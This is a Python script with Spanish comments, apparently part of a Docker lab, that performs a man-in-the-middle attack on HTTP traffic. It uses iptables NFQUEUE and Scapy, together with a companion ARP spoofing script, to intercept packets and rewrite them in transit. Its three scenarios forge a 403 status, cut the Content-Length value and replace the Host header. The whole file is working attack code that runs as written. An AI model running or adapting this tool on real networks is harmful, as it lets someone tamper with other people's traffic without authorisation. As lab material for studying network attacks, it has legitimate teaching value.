"""
mitm_modify.py
Intercepta paquetes HTTP redirigidos por iptables hacia una NFQUEUE y
modifica campos especificos "on-the-fly" antes de reenviarlos.

Requiere que previamente se haya ejecutado, dentro de este mismo
contenedor:
    sysctl -w net.ipv4.ip_forward=1
    iptables -I FORWARD -j NFQUEUE --queue-num 0

Y en paralelo, arp_spoof.py corriendo para que el trafico realmente pase
por aqui.

Uso:
    python3 mitm_modify.py --scenario status_code
    python3 mitm_modify.py --scenario content_length
    python3 mitm_modify.py --scenario host_header
"""
import argparse
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

SERVER_PORT = 80
contador = {"modificados": 0}


def recalcular(pkt_scapy):
    """Elimina longitudes/checksums para que Scapy los recalcule al hacer build()."""
    del pkt_scapy[IP].len
    del pkt_scapy[IP].chksum
    del pkt_scapy[TCP].chksum
    return pkt_scapy


def escenario_status_code(pkt_scapy):
    """Modificacion 1: intercepta la RESPUESTA del servidor y cambia
    '200 OK' por '403 Forbidden' antes de que llegue al cliente Wget."""
    if pkt_scapy.haslayer(Raw):
        payload = pkt_scapy[Raw].load
        if payload.startswith(b"HTTP/1.1 200 OK"):
            nuevo = payload.replace(b"HTTP/1.1 200 OK", b"HTTP/1.1 403 Forbidden", 1)
            pkt_scapy[Raw].load = nuevo
            return recalcular(pkt_scapy), True
    return pkt_scapy, False


def escenario_content_length(pkt_scapy):
    """Modificacion 2: intercepta la RESPUESTA del servidor y reduce el
    valor de Content-Length a una fraccion del real (payload truncado
    desde la perspectiva del cliente)."""
    if pkt_scapy.haslayer(Raw):
        payload = pkt_scapy[Raw].load
        if b"Content-Length:" in payload:
            import re
            match = re.search(rb"Content-Length:\s*(\d+)", payload)
            if match:
                valor_real = int(match.group(1))
                valor_falso = max(1, valor_real // 10)
                nuevo = re.sub(rb"Content-Length:\s*\d+",
                                f"Content-Length: {valor_falso}".encode(), payload, count=1)
                pkt_scapy[Raw].load = nuevo
                return recalcular(pkt_scapy), True
    return pkt_scapy, False


def escenario_host_header(pkt_scapy):
    """Modificacion 3: intercepta la SOLICITUD del cliente y altera el
    header Host: a un valor inexistente, para observar como responde
    Nginx (400 Bad Request o rechazo del vhost)."""
    if pkt_scapy.haslayer(Raw):
        payload = pkt_scapy[Raw].load
        if payload.startswith(b"GET") and b"Host:" in payload:
            nuevo = payload.replace(b"Host: servidor_http", b"Host: host-inexistente.local", 1)
            if nuevo != payload:
                pkt_scapy[Raw].load = nuevo
                return recalcular(pkt_scapy), True
    return pkt_scapy, False


ESCENARIOS = {
    "status_code": escenario_status_code,
    "content_length": escenario_content_length,
    "host_header": escenario_host_header,
}


def procesar(paquete_nfq, funcion_escenario):
    payload_crudo = paquete_nfq.get_payload()
    pkt_scapy = IP(payload_crudo)

    if pkt_scapy.haslayer(TCP) and (pkt_scapy[TCP].sport == SERVER_PORT or pkt_scapy[TCP].dport == SERVER_PORT):
        pkt_modificado, cambiado = funcion_escenario(pkt_scapy)
        if cambiado:
            contador["modificados"] += 1
            print(f"[MODIFICADO #{contador['modificados']}] {pkt_scapy[IP].src} -> {pkt_scapy[IP].dst}")
            paquete_nfq.set_payload(bytes(pkt_modificado))

    paquete_nfq.accept()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--scenario", required=True, choices=ESCENARIOS.keys())
    parser.add_argument("--queue-num", type=int, default=0)
    args = parser.parse_args()

    funcion = ESCENARIOS[args.scenario]
    nfqueue = NetfilterQueue()
    nfqueue.bind(args.queue_num, lambda pkt: procesar(pkt, funcion))

    print(f"[+] Escuchando NFQUEUE #{args.queue_num} | Escenario: {args.scenario}")
    print("[+] Ejecuta ahora 'docker exec cliente_http wget -O /dev/null http://servidor_http' "
          "desde el host para generar trafico.")
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print(f"\n[+] Total de paquetes modificados: {contador['modificados']}")
        nfqueue.unbind()
